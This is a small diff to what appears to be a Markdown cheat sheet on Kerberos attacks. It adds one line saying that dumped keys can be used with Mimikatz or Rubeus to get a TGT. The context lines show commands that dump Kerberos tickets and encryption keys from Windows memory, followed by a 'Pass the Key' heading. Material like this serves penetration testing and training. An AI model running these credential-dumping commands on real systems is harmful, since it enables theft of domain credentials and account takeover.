@@ -58,6 +58,7 @@ Rubeus.exe dump /nowrap
 ```powershell
 mimikatz.exe privilege::debug "sekurlsa::ekeys"
 ```
+after we got the keys we can use Mimikatz or Rubeus to Get the `TGT`
 
 ### Mimikatz - Pass the Key or OverPass the Hash
 ```powershell
